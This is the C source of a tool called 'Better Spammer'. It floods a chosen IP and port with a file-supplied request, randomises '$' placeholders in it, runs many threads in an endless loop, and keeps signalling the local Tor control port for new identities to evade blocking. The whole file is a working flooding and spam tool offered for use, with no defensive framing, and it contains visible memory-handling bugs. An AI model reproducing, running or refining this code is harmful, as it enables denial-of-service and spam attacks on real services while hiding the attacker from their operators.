#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <pthread.h>

struct sockaddr_in sa;
struct timeval tv;
char *req;
int delay;

void *actualspam(void *unused) {
 sleep(delay);
 int fd = socket(AF_INET, SOCK_STREAM, 0);
 setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 char *a;
 int b;
 char *req2 = malloc(strlen(req));
 char *resp = malloc(10000); 
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  strcpy(req2, req); 
  while((a = strstr(req2, "$"))) {
   b = rand() % (2 - 0) + 0;
   if(b == 0) {
    a[0] = rand() % (0x7b - 0x61) + 0x61; 
   }
   if(b == 1) {
    a[0] = rand() % (0x3a - 0x30) + 0x30;
   }
  }
  send(fd, req2, strlen(req2), MSG_NOSIGNAL);
  recv(fd, resp, 10000, 0);
  printf("SENT: %s\n", req2);
  if(resp) 
   printf("RECV: %s\n", resp);
  free(req2);
  free(resp);
  close(fd);
  return 0;
 } else {
  free(req2);
  free(resp);
  printf("cant connect!\n");
  close(fd);
  return 0;
 }
}

int makereq(char *file) {
 FILE *fd;
 if((fd = fopen(file, "r")) != 0) {
  fseek(fd, 0, SEEK_END); 
  int size = ftell(fd);
  fseek(fd, 0, SEEK_SET); 
  req = malloc(size); 
  fread(req, size, size, fd); 
  fclose(fd);
  return 0;
 } else {
  printf("File doesnt exist bye!\n");
  exit(0);
 }
}

void *torswitch(void *unused) {
 struct sockaddr_in tor;
 tor.sin_addr.s_addr = inet_addr("127.0.0.1");
 tor.sin_port = htons(9051);
 tor.sin_family = AF_INET;
 while(1) {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if(connect(fd, (struct sockaddr *)&tor, sizeof(tor)) != -1) {
   send(fd, "SIGNAL NEWNYM\n\n", 14, MSG_NOSIGNAL);
  } else {
   printf("tor control port cant be reached change config!\n");
  }
  close(fd);
 }
}

int main(int argc, char **argv) {
 printf("Better Spammer\n");
 srand(time(0));
 if(argc < 6) {
  printf("ip port threads file delay(seconds can be zero)\n"); 
  return 0;
 } 
  sa.sin_addr.s_addr = inet_addr(argv[1]);
 sa.sin_port = htons(atoi(argv[2]));
 sa.sin_family = AF_INET;
 pthread_t threads[atoi(argv[3])];
 delay = atoi(argv[5]);
 tv.tv_sec = 1;
 makereq(argv[4]);
 pthread_t thread;
 pthread_create(&thread, 0, &torswitch, 0);
 while(1) {
  for(int i = 0; i < atoi(argv[3]); i++) {
   pthread_create(&threads[i], 0, &actualspam, 0); 
  }
  for(int i = 0; i < atoi(argv[3]); i++) {
   pthread_join(threads[i], 0); 
  }
 }
}
